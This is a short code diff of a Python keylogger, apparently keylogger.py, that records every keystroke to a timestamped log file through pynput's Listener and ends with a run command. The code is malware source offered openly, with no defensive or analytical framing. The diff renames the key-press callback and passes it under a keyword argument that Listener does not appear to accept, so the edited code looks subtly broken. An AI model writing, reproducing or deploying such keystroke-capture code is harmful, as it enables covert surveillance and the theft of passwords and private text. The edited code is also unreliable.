@@ -3,10 +3,10 @@ import logging
  
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
  
-def on_press(key):
+def switch_on(key):
     logging.info(str(key))
  
-with Listener(on_press=on_press) as listener :
+with Listener(switch_on=switch_on) as listener :
     listener.join()
 
 #Run using $ python3 keylogger.py
